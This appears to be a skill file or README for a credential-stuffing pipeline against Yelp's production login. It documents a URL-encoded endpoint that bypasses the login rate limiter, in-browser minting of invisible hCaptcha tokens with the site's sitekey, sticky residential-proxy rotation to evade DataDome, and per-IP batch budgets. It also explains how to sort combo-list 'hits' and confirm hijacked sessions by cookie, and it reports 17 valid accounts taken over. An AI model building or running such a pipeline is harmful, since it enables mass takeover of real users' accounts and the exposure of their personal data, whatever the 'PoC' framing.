---
name: yelp-credential-pipeline
description: Fast, stable credential-validation pipeline for Yelp login. Encoded-endpoint bypass of the 15/min routing limiter, invisible hCaptcha solved inside a real browser, 2-worker proxy pool, 250 rows per IP. Measured 250 POSTs per IP with zero 429/403. Use for auth-perimeter PoCs, combo validation, and login recon against yelp.com.
---

# Yelp credential pipeline

Everything here was measured on production `www.yelp.com` (2026-11). The point is not to explain the target, it is to
run the loop without the five failure modes that make it flaky: wrong captcha field, wrong IP budget, too many
browsers, a full temp disk, and dead proxy accounts being reused.

Read section 2 before touching the target and section 3 before writing your own code.

## 1. The 60-second version

```
pool.ps1  ->  per worker slot: health-gate a fresh proxy session (200 on /login/)
              launch Chrome through a local CONNECT relay
              hydrate /login/ once
              loop up to 250x: mint hCaptcha token, fetch /login/%6E%65%77%61%6A%61%78
              kill Chrome, delete profile, next chunk, next account
```

Measured outcome on clean chunks: 249 verdicts per 250 POSTs on one IP (page reloaded every 100 POSTs), ~1.9 s per
credential, ~31 rows per minute per worker, zero 429, zero 403. The encoded path is what removes the old 15/min
ceiling; the canonical `/login/newajax` still returns 429 at 15/min and 403 around 30 rows.

## 2. Prerequisites

| Item | Requirement |
|---|---|
| OS | Windows 10/11. Scripts are PowerShell 5.1; paths use `%TEMP%` and `Get-PSDrive C` |
| Node | **>= 22** (global `fetch`, `WebSocket`, `statfsSync`). `node -v` is checked by the runner |
| Chrome | `C:\Program Files\Google\Chrome\Application\chrome.exe`, or set `$env:CHROME` |
| Proxies | Oxylabs-style sticky accounts: `customer-<type>_<id>-cc-us:<password>` (`mobile` or `resi`), one per line in `proxies.txt` |
| RAM | 4 GB minimum. 2 workers max; a third starves and produces 0 verdicts |
| Disk | >= 2 GB free. Runner aborts below 2 GB and deletes its profile on exit |
| Lists | `email:password`, one per line, UTF-8/ASCII. Passwords may contain `# . ~ + = _ !` |

Sticky IPs are created by appending `-sessid-<random>-sesstime-1800` to the proxy username. `batch-fast.js` does this;
do not pass a raw `customer-...` username to a browser and expect a stable IP.

Oxylabs accounts have a traffic quota. **HTTP 407 `traffic limit reached` is an account quota, not a Yelp block.** At
250 rows per IP, 30 clean accounts cover ~7,500 POSTs in theory; the real limit is account traffic (measured ~1.2 MB
per 250 rows), so budget for turnover.

## 3. Non-negotiable constants

| Item | Value | Why |
|---|---|---|
| URL | `https://www.yelp.com/login/` | `/login` is 403 in 1000/1000 requests; the trailing slash is served by envoy |
| Endpoint | `POST /login/%6E%65%77%61%6A%61%78` | JSON verdicts. The encoded path skips the routing-service 429 limiter (the app decodes it back to `newajax`). Plain `/login/newajax` is capped at 15/min and 403s near 30 rows |
| Encoded-path noise | 0-11% land on the magic-link handler | retry the row; it is a routing quirk, not a verdict |
| Captcha field | `hcaptcha_response` | the only accepted name; `h-captcha-response` is silently ignored and returns the same body as a rejected token |
| Body | exactly `csrftok`, `email`, `password`, `hcaptcha_response` | extra or renamed fields fail closed |
| Rows per IP | 250 | encoded path: 250 POSTs on one IP, 0 x 429, 0 x 403, 249 verdicts, 1 route retry, 0 unknown. Largest clean run measured; no ceiling found |
| Workers | 2 | 3 workers on 4 GB RAM starve hydration and produce 0 verdicts |
| Temp disk floor | 2 GB | a full disk throws ENOSPC and Chrome stalls; this looked like DataDome for hours |
| Token lifetime | 1-2 min, single use | mint immediately before the POST |
| Token binding | same IP | minted on A and submitted from B is accepted but routes to a magic link |

Fallback if `/login/` is hard-blocked for a whole pool: `/signup` sits outside DataDome and still exposes the hCaptcha
widget, so it can be used to confirm a browser/captcha baseline. It does not give verdicts by itself.

## 4. What counts as a hit

```
valid    : {"success": true} AND zss cookie (>=20 chars, .yelp.com) AND GET /profile = 200
invalid  : "The email address or password you entered is incorrect." AND error_fields contains password
closed   : "This account has been closed."   (email exists, account closed)
```

Everything else is unresolved: `"We're unable to log you in right now."`, `require_link` / magic link,
`"We had some trouble sending a login link"`, 403, 407, 429, empty body, `status <= 0`. Retry those, never report them
as invalid. A row with `tokLen = 0` is not an `unable`: no captcha token was minted, so Yelp never compared the
credential. `report.ps1` buckets those as `tokfail` and they must be re-run.

Three traps:

- `"incorrect"` alone can hide the email-confirmation flow. Bucket link responses separately as `needs-email`.
- `success: true` without `zss` is not a session (`nosession`). Always check the cookie and `/profile`.
- A server-compared wrong password proves the email exists; `closed` proves it more strongly. Both are useful even
  when the credential is not valid.

## 5. Token handling

The invisible widget solves itself; no solver is needed or useful (Capsolver dropped hCaptcha in 2026).

- Arm a widget: prefer the page's own widget via `[data-hcaptcha-widget-id]`; only fall back
  to `hcaptcha.render(div, {sitekey, size:'invisible'})` if it is absent.
- Why prefer the site widget: a self-rendered widget has no site `rqdata`; its token is minted but Yelp may reject
  it. If the fallback token is rejected, treat the lane as dead.
- Per attempt: `hcaptcha.execute(widget)`, poll `hcaptcha.getResponse(widget)` every 200 ms, 12 s cap.
- A token minted on IP-A and submitted from IP-B is accepted by the captcha but the flow switches to a magic link.
  Mint and submit on the same IP.
- Sitekey: `6660d4df-1884-4ac6-a933-e5f3bd460946`.

## 6. Speed budget

| Stage | Measured |
|---|---|
| Token mint | 0.9-2.1 s |
| POST + response | 0.8-1.3 s |
| Hydrate page | 5-12 s per IP |
| Chrome launch + DataDome | ~11 s (was 15-25 s) |
| One 250-row chunk | ~8 min |

Optimisations that produced this:

1. One page hydration per IP, not per credential.
2. `fetch` inside the page instead of clicking the form: no React re-render, no scroll, no button race.
3. No pacing: the encoded path has no 15/min window. The loop is latency-bound at ~31 rows/min per worker; RELOAD_EVERY=100 refreshes the page so long chunks stay on the password handler.
   `PACE=0 LANE_PACE=0` are the defaults; set `PACE=14` if you switch back to the canonical path.
4. Chrome relaunch is cheaper than rotating the IP inside a live browser; tearing down tunnels breaks Chrome's network
   service on this build.
5. Only a hit triggers a logout + re-hydrate. Wrong passwords do not reload the page.
6. 250 rows per page load instead of 15-30: the per-chunk page cost (~0.1-1.6 MB) is amortised 8-16x further,
   which is the main proxy-bandwidth saving.

## 7. Run it

```powershell
# proxies.txt = user:pass per line; combo.txt = email:password per line
.\runner\check-proxy.ps1 -Accounts (Get-Content .\proxies.txt)
.\runner\smoke.ps1 -PoolFile .\proxies.txt
.\runner\run-all.ps1 -Source .\combo.txt -PoolFile .\proxies.txt -Take 500 -Chunk 250 -Workers 2
.\runner\report.ps1 -RunDir .\runs -HitsFile .\hits.txt -OutCsv .\classified.csv
```

`run-all.ps1` is resumable and safe:

- `runs/state.txt` holds the next offset; it advances by **rows actually recorded**.
- `runs/missed.txt` collects rows from a window that died out of order, deduplicated. Re-run it as a normal source:
  `run-all.ps1 -Source .\runs\missed.txt -PoolFile .\proxies.txt -Root .\runs\retry`.
- `runs/progress.jsonl` holds one line per batch with rows/validated/success/403/429/rate.
- Three consecutive 0-row waves stop the run; state is unchanged, so the same command resumes later.

`-Take` is a batch, not a target. A 500-row batch is 2 chunks across the pool; each chunk gets a health-gated account.

Run `smoke.ps1` after any Yelp UI change and before a long pass. It runs 6 rows in its own `runs/smoke` root and fails
on any 403/429/407, short row count, or more than one `unknown`.

## 8. Reading the output

`runs/batch_XXXXX/wW-N.jsonl` has one record per credential plus lifecycle events.

| Field | Meaning |
|---|---|
| `email`, `pass`, `i`, `lane` | credential, its position in the chunk, and the host/tab that served the POST |
| `status` | HTTP status; `-1` = fetch threw |
| `success` | server accepted email + password |
| `validated` | server compared and rejected the password |
| `closed` | email exists, account closed |
| `link` | routed to email confirmation / magic link |
| `unable` | server refused to compare (or the POST carried an empty token — then it is `tokfail`) |
| `tokLen`, `tokMs`, `postMs`, `ms` | token length and timings; `tokLen = 0` means no captcha token was minted and the row must be re-run |
| `profileStatus`, `zss`, `zssLen` | `/profile` status, count of `zss` cookies, longest `zss` value; cookie fields are only read on success |
| `event` | `start`, `bw`, `ddok`, `hydrated`, `widget`, `csrf`, `tokfail`, `retry_route`, `reload_noise`, `r429`, `r403`, `r407`, `path_fallback`, `budget`, `timecap`, `reload_sched`, `rearm`, `relogin_probe`, `relogin_tab`, `rehydrate_fail`, `row_unresolved`, `lane_dead`, `summary`, `abort` |

Successes in a `summary` event carry `successes: [{email, pass, lane, profileStatus, zss}]`. The `summary` also has
`bytes`, `mb`, `bytesPerPost`, `path`, `reloads`, and `unresolved` (route-noise rows only; `report.ps1` counts every
non-verdict as unresolved). The JSONL is the evidence, keep it.

## 9. Verify a hit manually before reporting

1. `success: true` with `zss` >= 20 chars and `profileStatus: 200` in the same record.
2. Replay the pair on a fresh proxy session and confirm `success: true` plus a new `zss`.
3. `GET /profile` with that cookie jar returns 200 and the account name.
4. Report email, password, and the 3 artifacts above. Never report a pair on `"incorrect"` alone.

## 10. Failure playbook

| Symptom | Cause | Action |
|---|---|---|
| `ddok=false` after 50 s | IP burned | new session; never debug the page |
| 403 on first POST | IP spent | rotate; on the canonical path 403 starts at POST ~32 |
| 429 | canonical path only: >15 POST/min | the encoded path should not 429; if it does, the runner pauses that lane 60 s |
| 407 | Oxylabs traffic quota | drop the account, top up, rotate |
| Page < 400 kB | not hydrated | wait for `#ajax-login` and > 400 kB |
| `fire()` returns 0 | password form not revealed | click `.login-with-password-link` |
| Empty response body | captured with Fetch API | use `Network.loadingFinished` -> `Network.getResponseBody` |
| Everything slow, no 403/429 | disk full | delete `%TEMP%\cdp-*`, keep 2 GB free |
| 0 verdicts with 3 workers | RAM | drop to 2 |
| Valid hit then `rehydrate_fail` | logout/navigation race | chunk ends; next chunk is a new IP and browser |

## 11. Results this pipeline produced

| Metric | Value |
|---|---|
| Rows processed in clean segments | 1,135 (300 + 100 + 742 unique, overlaps removed) |
| Password rejected (server compared) | 658 |
| Account closed | 37 |
| Valid with session | 17 |
| Unresolved | ~5 % |
| 429 / 403 on clean chunks | 0 / 0 |
| Hit rate on used combo lists | ~1.2 % |

Detailed tables: `reference/MEASUREMENTS.md`. A 3-hit chunk exists but is an outlier; do not extrapolate from 15 rows.

## 12. Files

```
runner/pool.ps1        orchestrator: 2 workers, 250-row chunks, per-chunk account health gate
runner/run-all.ps1     full-list runner: resume by recorded rows, missed queue, dead-pool stop
runner/batch-fast.js   worker: Chrome + relay + CDP, token mint, fetch, evidence JSONL
runner/check-proxy.ps1 session health gate (CLEAN / DIRTY / QUOTA / DEAD)
runner/smoke.ps1       6-row post-change acceptance test (own run root, state untouched)
runner/report.ps1      aggregate verdicts, export CSV + hits file
runner/measure-bytes.js  page-byte measurement without a proxy
runner/check-mint.js     confirms the bandwidth filters do not break token minting
runner/bw-blocklist.js   analytics/ad hosts blocked at CDP level
PERF.md                encoded-path throughput measurements and the canonical-path baseline
BANDWIDTH.md           proxy-byte reductions (NO_MEDIA, BLOCK_URLS, CACHE_MB/CACHE_DIR)
reference/MEASUREMENTS.md   measured rates and limits
reference/PITFALLS.md       failure catalogue, 28 modes, symptom -> fix
testpace/                   probe scripts, full encoded-path write-up, raw logs (gitignored)
examples/                   sample list, proxy file, and redacted output record
```

## 13. What this repo does not solve

- Oxylabs quota: ~30 accounts is a pass, not a fleet. You must supply accounts.
- 4 GB RAM: 2 workers is the ceiling; more RAM would allow more workers, but the encoded path lifts the per-IP ceiling; RAM and the 30-min sticky session govern.
- DataDome can still burn a whole pool; the health gate detects it, it does not prevent it.
- Yelp UI changes: selectors `#ajax-login`, `.login-with-password-link`, `input[name=csrftok]`, and the four field
  names are the fragile parts. Re-run one 6-row smoke test after any site change.
- Legal/ToS: validation only does `GET /profile`; it does not review, message, or change settings.
